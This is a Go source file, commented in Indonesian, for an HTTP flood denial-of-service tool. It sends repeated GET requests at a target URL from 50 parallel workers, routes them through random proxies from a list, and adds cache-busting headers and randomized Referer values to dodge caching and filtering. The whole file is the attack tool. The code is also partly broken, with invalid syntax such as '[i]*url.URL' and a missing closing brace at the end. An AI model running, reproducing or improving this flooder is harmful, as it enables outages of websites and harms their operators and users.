package main

import (
    "bufio"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "time"
)

var (
    referers     []string
    totalSuccess int32 
)

func buildblock(size int) (s string) {
    var a []rune
    for i := 0; i < size; i++ {
        a = append(a, rune(rand.Intn(75)+1555))
    }
    return string(a)
}

func readReferers(scanner *bufio.Scanner, ch chan string) {
    for scanner.Scan() {
        referer := scanner.Text()
        ch <- referer
    }
    close(ch)
}

func main() {
    // Pastikan terdapat argumen baris perintah yang diberikan
    if len(os.Args) < 2 {
        fmt.Println("Usage: go run main.go <targetURL>")
        return
    }

    targetURL := os.Args[1] // URL target dari argumen baris perintah

    // Baca file proxy list
    proxyFile, err := os.Open("proxy.txt")
    if err != nil {
        fmt.Println("Error opening proxy list file:", err)
        return
    }
    defer proxyFile.Close()

    var proxyURLs [i]*url.URL
    scanner := bufio.NewScanner(proxyFile)
    for scanner.Scan() {
        proxyStr := "http://" + scanner.Text() // Format proxy string
        proxyURL, err := url.Parse(proxyStr)
        if err != nil {
            fmt.Println("Error parsing proxy URL:", err)
            continue
        }
        proxyURLs = append(proxyURLs, proxyURL)
    }

    
    // Ciptakan chennel untuk membaca referers.txt
    refererChannel := make(chan string)
    file, err := os.Open("referers.txt")
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
    defer file.Close()
    refererScanner := bufio.NewScanner(file)

    go readReferers(refererScanner, refererChannel)

    // Membuat request dengan header khusus
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        fmt.Println("Error creating request:", err)
        return
    }

    req.Header.Add("User-Agent", "My-Go-App-User-Agent")
    req.Header.Add("Pragma", "no-cache")
    req.Header.Add("Cache-Control", "no-store, no-cache")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("sec-fetch-site", "cross-site")
    req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
    req.Header.Set("Connection", "keep-alive")

    for i := 0; i < 50; i++ {
        go func() { // Using a goroutine to run each worker in parallel
            for referer := range refererChannel {
                transport := &http.Transport{
                    Proxy: http.ProxyURL(proxyURLs[rand.Intn(len(proxyURLs))]), // Use random proxy from the list
                    MaxIdleConns:        20,
                    MaxIdleConnsPerHost: 20,
                }
                client := &http.Client{
                    Timeout:   2000 * time.Millisecond,
                    Transport: transport,
                }
            
                req.Header.Set("Referer", referer+buildblock(rand.Intn(5)+5))

                // Make 100 requests using one proxy and referer
                for j := 0; j < 100; j++ {
                    resp, err := client.Do(req)
                    if err != nil {
                        continue
                    }
                    defer resp.Body.Close()
                    fmt.Println("Request successful with proxy", proxyURLs[rand.Intn(len(proxyURLs))].String(), "for referer", referer, "Request number", j)
                }
            }
        }()
    }
    
    time.Sleep(50 * time.Second)
